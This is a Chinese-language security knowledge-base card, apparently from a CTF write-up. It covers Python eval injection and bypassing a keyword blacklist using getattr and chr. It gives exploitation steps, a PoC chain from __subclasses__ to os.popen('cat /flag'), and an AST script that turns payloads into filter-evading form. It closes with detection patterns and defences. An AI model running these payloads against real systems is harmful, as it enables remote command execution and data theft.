---
id: web-python-ssti-getattr-chr-blacklist-bypass
title: Python 表达式 SSTI 黑名单绕过：getattr+chr 拼接 __class__/__globals__/__builtins__，AST 自动生成 payload
type: scenario
domain: web
path: web/python/ssti
technique: python-eval-getattr-chr-blacklist-bypass
tags:
- ssti
- python
- eval
- waf-bypass
- getattr
- chr
- subclasses
- globals
- builtins
- ast
- ctf
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-06'
verification:
  verified_by: verifier-V113
  verified_at: '2026-11-06T02:00:19+08:00'
  notes: 已对照原文Escape, escape!段与图01核对：/admin/render?expr=7*7回显49、黑名单__/open/globals/os/sys/import/eval/exec/read/subclasses/builtins、getattr+chr拼__class__、AST脚本把Attribute转getattr/字符串常量转chr、最终app.py中flag{proxy_smuggling_and_sandbox_escape}均一致；核对方已把原卡中不可直接注入的手工链改为原文AST脚本的输入表达式。未验证点：PoC未本机复跑；frontmatter无sources/source_url。
url: /docs/web/python/ssti/web-python-ssti-getattr-chr-blacklist-bypass/
draft: false
kb_aliases:
- Escape, escape!
- expr=7*7
- getattr chr 绕过
- __class__ 黑名单绕过
- __globals__ 子类枚举
- AST 自动生成 SSTI payload
- Python 表达式注入
---

## 一句话结论

`/admin/render?expr=7*7` 回显 49，说明服务端直接用 Python `eval`/表达式求值；黑名单拦 `__`、`open`、`globals`、`os`、`sys`、`import`、`eval`、`exec`、`read`、`subclasses`、`builtins` 等关键词，但可以用 `getattr` + `chr(95)` 拼出 `__class__`、`__base__`、`__subclasses__`、`__globals__`、`__builtins__`，再用 `['__builtins__']['__import__']('os').popen('cmd').read()` 执行命令；AST 脚本可把任意 Python 表达式自动转成 `getattr` + `chr` 形式并 URL 编码。

## 原理

- **表达式注入**：路由把 `expr` 直接交给 Python `eval`/`compile` 求值，`7*7` 返回 49；这不是 Jinja2 模板，而是原始 Python 表达式上下文，因此可直接用 Python 语法构造对象图。
- **黑名单只做子串匹配**：`blocked: __` 说明 `().__class__` 被拦；黑名单还包括 `open/globals/os/sys/import/eval/exec/read/subclasses/builtins`。这种过滤对“拼接/编码后的等价字符串”无效。
- **getattr + chr 绕过**：`chr(95)` 是 `_`，`getattr((), chr(95)+chr(95)+'class'+chr(95)+chr(95))` 得到 `().__class__`，返回 `<class 'tuple'>`；`getattr` 本身不在黑名单，字符串里也没有连续的 `__`。
- **子类枚举**：用 `getattr(getattr((), '__class__'), '__base__')` 取 `object`，再 `getattr(..., '__subclasses__')()`；为了绕 `subclasses` 关键词，也可用 `getattr(..., chr(95)*2+'subclasses'+chr(95)*2)()`。
- **收集 globals**：对每个子类取 `__init__` 方法的 `__globals__`：
  ```python
  [g for c in subclasses()
     for g in [getattr(getattr(c, '__init__', None), '__globals__', None)]
     if g]
  ```
  这些 globals 字典里通常含 `__builtins__`、`os`、`sys` 等模块。
- **命令执行**：取某个 globals 的 `__builtins__` 字典，用 `['__import__']('os')` 导入 os，再 `popen('cmd').read()`；也可以用 `getattr` 取 `__builtins__` 里的 `__import__`，或用 `os._wrap_close` 等子类直接实例化 `Popen`。
- **AST 自动化**：把表达式解析成 AST，将 `Attribute` 转成 `getattr(obj, chrify(attr))`、字符串常量转成 `chr(...)` 拼接、`Call/Subscript/ListComp` 递归转换，最后 URL 编码；这样任意对象图都能自动生成绕过黑名单的 payload。

## 触发条件

- 应用把用户输入当 Python 表达式求值（`eval`、`exec`、`compile`、模板引擎的 Python 表达式、低代码表达式节点）。
- 存在关键词黑名单（`__`、`globals`、`subclasses`、`builtins` 等），但没有真正的沙箱/AST 白名单。
- 进程已加载 `os`/`subprocess` 等模块，或可通过 `__subclasses__`/`__globals__` 找到它们。
- 能控制参数并读取回显；或能通过错误/盲信道外带。

## 利用步骤

1. 用 `expr=7*7` 确认表达式求值；用 `expr=().__class__` 确认黑名单返回 `blocked: __`。
2. 用 `getattr((), chr(95)+chr(95)+'class'+chr(95)+chr(95))` 返回 `<class 'tuple'>`，确认 `getattr`/`chr` 可用。
3. 构造 `getattr` 链取 `__base__`、`__subclasses__()`；用列表推导收集各子类的 `__init__.__globals__`。
4. 从 globals 取 `__builtins__`，用 `__import__('os')` 导入 os，`popen('id').read()` 验证命令执行。
5. 读取 `/flag`、`app.py`/Flask 配置中的真实 flag；注意环境变量里可能有假 flag。
6. 若手工太繁琐，用 AST 转换脚本把表达式自动转成 `getattr`+`chr` 并 URL 编码。

## PoC

原文实际用法：先把下面的“带黑名单词”的表达式交给 AST 脚本，脚本会把所有属性名与字符串常量转成 `getattr` + `chr` 拼接（见下一段核心代码），因此最终请求里不会出现 `__`、`os`、`read` 等字面量：

```python
[g for c in ().__class__.__base__.__subclasses__()
 for g in [getattr(getattr(c, '__init__', None), '__globals__', None)]
 if g][0]['__builtins__']['__import__']('os').popen('cat /flag').read()
```

AST 转换核心（原文脚本）：

```python
def chrify(s):
    return "+".join(f"chr({ord(c)})" for c in s)

# Attribute: x.y -> getattr(x, chrify("y"))
# Constant str -> chrify(value)
# Call/Subscript/ListComp 递归转换
```

原文实测 `expr=7*7` 回显 49，最终在 `app.py` 中读到 `flag{proxy_smuggling_and_sandbox_escape}`；未在本库复跑。

## 变体与关联

- **拼接变体**：`'_'+'_'`、`chr(95)`、`\x5f`、`%5f`、Unicode 转义、`getattr`/`vars`/`__getattribute__`、字典键访问。
- **对象图变体**：`__subclasses__`、`__globals__`、`__builtins__`、`__import__`、`os._wrap_close`、`subprocess.Popen`、`warnings.catch_warnings`。
- **引擎变体**：Python `eval`、Jinja2、Mako、Tornado、Django 模板、低代码表达式节点；黑名单不同，但拼接/getattr 思路通用。
- **关联卡片**：[[web-python-ssti-jinja2-subclasses-index-rce]]（Jinja2 子类索引 RCE）、[[web-python-ssti-mako-context-write-getattr-bypass]]（Mako getattr 绕过）、[[web-python-waf-bypass-dynamic-attribute-keyword-split]]（动态属性/关键词拆分）。

## 检测与防御

- **不要 eval 用户输入**：使用 AST 白名单/受限表达式引擎；禁止属性访问、调用、导入、推导式。
- **真正沙箱**：若必须求值，使用 `asteval`/`RestrictedPython` 等白名单沙箱，并限制 builtins/模块；不要只靠关键词黑名单。
- **黑名单不足**：同时拦截 `getattr`、`chr`、`__getattribute__`、`vars`、`globals`、`subclasses` 等只是提高成本，不能替代沙箱。
- **检测**：参数中出现 `getattr`、`chr(`、`__class__`、`__globals__`、`__subclasses__`、`popen`、`__import__` 等；请求长度异常/大量 URL 编码；Python 进程出现 `os.popen`/`subprocess` 子进程。
